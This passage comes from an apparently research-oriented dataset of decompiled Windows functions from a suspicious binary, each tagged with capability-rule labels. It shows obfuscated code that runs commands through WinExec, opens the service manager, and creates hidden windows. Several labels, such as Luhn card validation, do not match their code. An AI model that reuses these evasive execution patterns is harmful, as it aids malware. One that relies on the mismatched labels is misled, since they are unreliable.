>> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404780(auStack1564, 0x411634, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1866
    },
    "00404090": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040dc) overlaps instruction at (ram,0x004040da)\n// \n\nint32_t __cdecl fcn.00404090(uint32_t arg_8h, uint16_t *arg_ch, uchar *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t in_ECX;\n    uint32_t extraout_ECX;\n    uint in_EDX;\n    char *unaff_EBX;\n    uchar **ppuVar5;\n    uchar *unaff_ESI;\n    uchar *puVar6;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar7;\n    uint64_t uVar8;\n    uchar **ppuStack12;\n    \n    uVar8 = CONCAT44(in_EDX, in_EAX);\n    ppuStack12 = &stack0xfffffffc;\n    ppuVar5 = &stack0xfffffffc;\n    if ((!in_ZF) && (in_ZF)) {\n        unaff_EBX = unaff_EBX + 1;\n        bVar7 = unaff_EBX == NULL;\n        if (in_CF || bVar7) goto code_r0x004040ed;\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - unaff_EBX;\n    }\n    puVar6 = arg_10h;\n    if (arg_10h != NULL) {\n        do {\n            cVar3 = arg_10h;\n            if ((puVar6 < 0) || (puVar6 >= 0)) {\n                cVar3 = arg_8h + *arg_ch >> 0x10;\n            }\n            bVar7 = cVar3 + '3' + *unaff_EBX == '\\0';\n            ppuVar5 = &ppuStack12;\n            uVar8 = func_0xc0c5a6fb();\n            in_ECX = extraout_ECX;\n            arg_8h = extraout_ECX;\n            ppuStack12 = &ppuStack12;\n            unaff_ESI = puVar6;\n            if (!bVar7) {\ncode_r0x004040ed:\n                uVar4 = uVar8;\n                puVar6 = unaff_ESI;\n                if ((!bVar7) && (bVar7)) {\n                    uVar4 = uVar4 & 0xffffff00 | *0x4bb148d3;\n                    puVar6 = unaff_ESI + 1;\n                    out(*unaff_ESI, uVar8 >> 0x20);\n                }\n                arg_8h = (uVar4 & 0xffff) + (in_ECX & 0xffff);\n                uVar8 = uVar8 & 0xffffffff00000000 | arg_8h;\n                ppuStack12 = ppuVar5;\n            }\n            arg_10h = uVar8;\n            arg_ch = (uVar8 >> 0x20) + 2;\n            puVar6 = puVar6 + -1;\n        } while (puVar6 != NULL);\n    }\n    return arg_8h + (arg_8h >> 0x10);\n}\n",
        "token_count": 793
    },
    "00404ee0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f6b) overlaps instruction at (ram,0x00404f6a)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint * fcn.00404ee0(uint *param_1, uchar *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    char extraout_DH;\n    uint32_t unaff_EBX;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint *unaff_ESI;\n    uint *puVar6;\n    uint *unaff_EDI;\n    bool bVar7;\n    \n    puVar5 = &stack0xfffffffc;\n    if (0x7 < &stack0xfffffffc && *0x10 != 0xc) {\n        puVar5 = &stack0xfffffffc;\n        if (0x7 >= &stack0xfffffffc || *0x10 == 0xc) {\n            puVar6 = unaff_EDI + 1;\n            param_1 = unaff_ESI + 1;\n            *unaff_EDI = *unaff_ESI;\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            puVar5 = 0x8be181d0;\n            param_2 = &stack0xffffffe8;\n            while( true ) {\n                puVar5 = puVar5 + 1;\n                uVar1 = param_2 | 0x8b;\n                param_2 = param_2 | 0x8b;\n                unaff_EDI = puVar6;\n                if (uVar1 == 0) break;\n                if ((POPCOUNT(uVar1) & 1U) == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n        }\n    }\n    uVar2 = fcn.00404090(0, param_1, param_2 + 1 >> 1);\n    *(puVar5 + 8) = uVar2 & 0xffff;\n    uVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    *(puVar5 + -4) = uVar3;\n    puVar6 = *(puVar5 + -4);\n    uVar2 = puVar6[0x16];\n    if ((SBORROW1(extraout_DH, '6')) || (!SBORROW1(extraout_DH, '6'))) {\n        unaff_EBX = *(puVar5 + 8);\n        bVar7 = unaff_EBX < uVar2;\n    }\n    else {\n        uVar2 = uVar2 + 1;\n        *unaff_EDI = *puVar6;\n        bVar7 = unaff_EBX < uVar2;\n        puVar6 = puVar6 + 1;\n    }\n    if (bVar7) {\n        iVar4 = (unaff_EBX - uVar2 & 0xffff) - 1;\n        *(puVar5 + 8) = iVar4;\n    }\n    else {\n        iVar4 = unaff_EBX - (uVar2 & 0xffff);\n        *(puVar5 + 8) = iVar4;\n    }\n    *(puVar5 + -8) = uVar2 >> 0x10;\n    if (iVar4 < uVar2 >> 0x10) {\n        puVar6 = *(puVar5 + -4);\n        iVar4 = (*(puVar5 + 8) - *(puVar5 + -8) & 0xffffU) - 1;\n        *(puVar5 + 8) = iVar4;\n    }\n    else {\n        iVar4 = iVar4 - (uVar2 >> 0x10);\n    }\n    **(puVar5 + 0x14) = iVar4 + *(puVar5 + 0xc);\n    **(puVar5 + 0x10) = puVar6[0x16];\n    return puVar6;\n}\n",
        "token_count": 891
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401029) overlaps instruction at (ram,0x00401028)\n// \n\nvoid __cdecl fcn.00401000(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t in_DL;\n    int32_t unaff_EBX;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    bool in_OF;\n    \n    // [00] -r-x section size 20480 named .text\n    if (((!in_OF) && (in_OF)) || (unaff_ESI = 0,  unaff_EBX = arg_8h,  unaff_EDI = arg_ch,  arg_ch != 0)) {\n        do {\n            puVar1 = (CONCAT31(in_EAX >> 8, 0x98) | 0x33) + 0x51;\n            *puVar1 = *puVar1 | in_DL;\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar2 / 0x1a;\n            in_DL = iVar2 % 0x1a + 0x61;\n            *(unaff_ESI + unaff_EBX) = in_DL;\n            unaff_ESI = unaff_ESI + 1;\n        } while (unaff_ESI < unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 331
    },
    "004011a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011e6) overlaps instruction at (ram,0x004011e4)\n// \n\nuint __cdecl fcn.004011a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x407010, 0x4247f8, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        if ((iVar1 < 0) || (iVar1 >= 0)) {\n            (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 190
    },
    "004018a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004018a0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x424818 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x424818 = 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00401dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401dc0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401bb0(&var_68h, &var_4h);\n    fcn.00404130(&var_68h, var_4h, 0x4117e4, 0x13000);\n    *arg_8h = 0x4117e4;\n    *arg_ch = 0x13000;\n    return;\n}\n",
        "token_count": 243
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ff3) overlaps instruction at (ram,0x00401fee)\n// \n\nvoid __cdecl fcn.00401f80(uint arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char **extraout_ECX;\n    char **ppcVar4;\n    char **extraout_ECX_00;\n    char *pcVar5;\n    char *extraout_EDX;\n    char unaff_BL;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t **unaff_EDI;\n    uchar in_CF;\n    uchar uVar8;\n    uint8_t in_AF;\n    char cVar9;\n    ulong uVar10;\n    unkbyte6 Var11;\n    \n    puVar6 = &stack0xfffffffc;\n    cVar9 = arg_ch + -1 == NULL;\n    uVar8 = (POPCOUNT(arg_ch + -1 & 0xff) & 1U) == 0;\n    puVar7 = &stack0xfffffffc;\n    if (cVar9) {\n        Var11 = fcn.00402d10();\n        pcVar3 = Var11;\n        ppcVar4 = extraout_ECX;\n        if (!in_CF) {\n            while (in_CF) {\n                ppcVar4 = ppcVar4 + -1;\n                if (ppcVar4 == NULL || cVar9 == '\\0') {\n                    iVar2 = *arg_ch;\n                    *unaff_EDI = arg_ch + 1;\n                    pcVar3 = *0x9750e2b5;\n                    uVar10 = CONCAT44(iVar2 >> 0x1f, *0x9750e2b5);\n                    arg_ch = 0xe8b8ec44;\n                    **0x9750e2b5 = **0x9750e2b5 + *0x9750e2b5;\n                    uVar8 = (POPCOUNT(*pcVar3) & 1U) == 0;\n                    goto code_r0x00401fc0;\n                }\n                *(unaff_EDI + 0xfd286c9) = *(unaff_EDI + 0xfd286c9) + pcVar3;\n                pcVar5 = *ppcVar4;\n                *ppcVar4 = pcVar3;\n                *pcVar5 = *pcVar5 + pcVar5;\n                pcVar5[-0x18] = pcVar5[-0x18] + unaff_BL;\n                out(*arg_ch, Var11 >> 0x20);\n                in_CF = false;\n                pcVar3 = pcVar5 | 0x17720000;\n                cVar9 = pcVar3 == NULL;\n                uVar8 = (POPCOUNT(pcVar5 & 0xff) & 1U) == 0;\n                arg_ch = arg_ch + 1;\n            }\n        }\n        uVar10 = fcn.00402030();\n        ppcVar4 = extraout_ECX_00;\ncode_r0x00401fc0:\n        pcVar5 = uVar10 >> 0x20;\n        pcVar3 = uVar10;\n        if ((uVar8) || (!uVar8)) {\n            fcn.00402a60();\n            pcVar5 = extraout_EDX;\n        }\n        else {\n            out(*arg_ch, uVar10 >> 0x20);\n            do {\n                cVar9 = pcVar3 >> 8;\n                in_AF = 9 < (pcVar3 & 0xf) | in_AF;\n                pcVar3 = CONCAT31(CONCAT21(pcVar3 >> 0x10, cVar9 - in_AF), -in_AF);\n            } while (in_AF || cVar9 == *pcVar5);\n            piVar1 = unaff_EDI + pcVar5 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            ppcVar4[-6] = pcVar3;\n            *pcVar3 = *pcVar3 + -in_AF;\n            uVar8 = (POPCOUNT(*pcVar3) & 1U) == 0;\n            arg_ch = arg_ch + 1;\n        }\n        if ((uVar8) || (!uVar8)) {\n            puVar7 = &stack0xfffffffc;\n            if (*0x42481c != 0) goto code_r0x00402009;\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        }\n        else {\n            arg_ch = 0x34a96cf4;\n            puVar6 = *0xa117b43a;\n            puVar6[0x6a0d75c0] = puVar6[0x6a0d75c0] + pcVar5 + -0x47;\n        }\n        fcn.00403e80();\n        puVar7 = puVar6;\n    }\ncode_r0x00402009:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(puVar7 + 8), arg_ch, *(puVar7 + 0x10), *(puVar7 + 0x14));\n    return;\n}\n",
        "token_count": 1170
    },
    "004021d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004021d0(uint arg_8h)\n\n{\n    int32_t hSCManager;\n    uint uVar1;\n    int32_t unaff_EDI;\n    bool bVar2;\n    float10 extraout_ST0;\n    \n    bVar2 = false;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((!bVar2) && (bVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n        hSCManager = hSCManager + 5;\n    }\n    uVar1 = fcn.00403990(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 185
    },
    "00402230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402230(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "004023f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004023f0(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    bool bVar7;\n    bool bVar8;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405240;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41174c);\n    bVar7 = false;\n    bVar8 = iVar1 == 0;\n    if (bVar8) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x411758);\n    if ((!bVar7 && !bVar8) && (bVar7 || bVar8)) {\n        uVar2 = uVar2 & 0xe2f4cc58;\n    }\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x6c);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00402814:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00402820:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x004027db:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00402820;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00402617:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00402230(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x411780);\n                        if (iVar1 != 0) goto joined_r0x00402617;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x004027c0:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00402814;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x004027c0;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00402230(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00402330(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x004027db;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2515
    },
    "004032c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004033be) overlaps instruction at (ram,0x004033bb)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004032c0(void)\n\n{\n    char *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    char *pcVar5;\n    uint uVar6;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    ushort uVar7;\n    uint16_t uVar8;\n    int32_t unaff_EBX;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int32_t unaff_ESI;\n    uchar *puVar13;\n    uchar *puVar14;\n    char **unaff_EDI;\n    uint32_t uVar15;\n    ushort in_CS;\n    uchar uVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    uchar uVar18;\n    bool bVar19;\n    char cVar20;\n    char cVar21;\n    ulong uVar22;\n    unkbyte6 Var23;\n    \n    fcn.004015f0(0x407014, 0x10, 0x411364, 0x11);\n    fcn.004015f0(0x407014, 0x10, 0x411580, 0xf);\n    puVar4 = fcn.004015f0(0x407014, 0x10, 0x411590, 0x1a);\n    puVar11 = &stack0xffffffd8 ^ *(unaff_EBX + 0x6a);\n    iVar3 = unaff_ESI + 0x106a0041;\n    cVar21 = SCARRY4(unaff_ESI, 0x106a0041) != SCARRY4(iVar3, 0);\n    cVar20 = iVar3 < 0;\n    bVar17 = iVar3 == 0;\n    puVar11[-1] = 0x407014;\n    puVar11[-2] = 0x403371;\n    fcn.004015f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    if (!bVar17 && cVar21 == cVar20) {\n        *(puVar11 + -6) = puVar4;\n        puVar4 = puVar4 & 0xffff0000 | *(puVar11 + -6);\n    }\n    puVar11[-2] = 0xb;\n    puVar11[-3] = 0x4115f0;\n    puVar11[-4] = 0x10;\n    puVar11[-5] = 0x407014;\n    puVar11[-6] = 0x403390;\n    fcn.004015f0(puVar11[-5], puVar11[-4], puVar11[-3], puVar11[-2]);\n    puVar11[6] = unaff_EBX;\n    *(puVar11 + 0x16) = extraout_CX;\n    uVar16 = 0;\n    bVar17 = false;\n    uVar18 = (CONCAT11(extraout_CX >> 8 & unaff_EBX >> 8, extraout_CX | unaff_EBX) & unaff_EDI) == 0;\n    uVar9 = puVar11[6];\n    puVar11[6] = 8;\n    puVar11[5] = 0x4115fc;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x4033bb;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    if ((!bVar17) && (puVar11[2] = extraout_EDX,  bVar17)) {\n        unaff_EDI = puVar11[3];\n        pcVar5 = puVar11[10];\ncode_r0x004033ce:\n        *unaff_EDI = pcVar5;\n        return;\n    }\n    puVar11[2] = 9;\n    puVar11[1] = 0x411604;\n    *puVar11 = 0x10;\n    puVar11[-1] = 0x407014;\n    puVar11[-2] = 0x4033ee;\n    uVar22 = fcn.004015f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    pcVar5 = uVar22;\n    if (!uVar16 && !uVar18) {\n        *(puVar11 + -6) = puVar4;\n        puVar4 = puVar4 & 0xffff0000 | *(puVar11 + -6);\n        if (uVar16 || uVar18) {\n            if (!bVar17) {\n                *(puVar11 + -2) = in_CS;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *pcVar5 = *pcVar5 + uVar22;\n            pcVar1 = (uVar22 >> 0x20) + 0x66;\n            *pcVar1 = *pcVar1 + (uVar22 >> 0x20);\n            *puVar4 = *puVar4 | 0x61000000;\n            goto code_r0x004033ce;\n        }\n    }\n    puVar11[-2] = 9;\n    puVar11[-3] = 0x411610;\n    puVar11[-4] = 0x10;\n    puVar11[-5] = 0x407014;\n    puVar11[-6] = 0x403423;\n    uVar22 = fcn.004015f0(puVar11[-5], puVar11[-4], puVar11[-3], puVar11[-2]);\n    puVar11[6] = uVar22;\n    puVar11[5] = uVar22 >> 0x20;\n    puVar11[4] = puVar4;\n    puVar13 = puVar11[4];\n    puVar11[6] = 9;\n    puVar11[5] = 0x41161c;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x40344d;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    puVar11[6] = extraout_EDX_00;\n    *(puVar11 + 0x16) = uVar9;\n    uVar7 = *(puVar11 + 0x16);\n    uVar9 = (uVar9 >> 8 & 0xffff00) << 8;\n    puVar11[6] = 0xc;\n    puVar11[5] = 0x411628;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x403484;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    *(puVar11 + 0x1a) = uVar7;\n    *(puVar11 + 0x16) = extraout_EDX_01;\n    *(puVar11 + 0x12) = unaff_EDI;\n    uVar15 = *(puVar11 + 0x12);\n    uVar7 = *(puVar11 + 0x1a);\n    puVar11[6] = 3;\n    puVar11[5] = 0x411634;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x4034a7;\n    Var23 = fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    *(puVar11 + 0x1a) = uVar7;\n    *(puVar11 + 6) = Var23 >> 0x20;\n    puVar11[5] = Var23;\n    bVar17 = Var23 == 0x6e32;\n    uVar8 = *(puVar11 + 0x1a);\n    uVar10 = uVar9 | uVar8;\n    puVar11[6] = 10;\n    puVar11[5] = 0x411638;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x4034df;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    puVar14 = puVar13;\n    if ((!bVar17) && (uVar10 = uVar9 | uVar8,  bVar17)) {\n        puVar14 = puVar13 + 1;\n        out(*puVar13, extraout_DX);\n    }\n    puVar11[2] = 0x40;\n    puVar11[1] = 0x411644;\n    *puVar11 = 0x10;\n    puVar11[-1] = 0x407014;\n    puVar11[-2] = 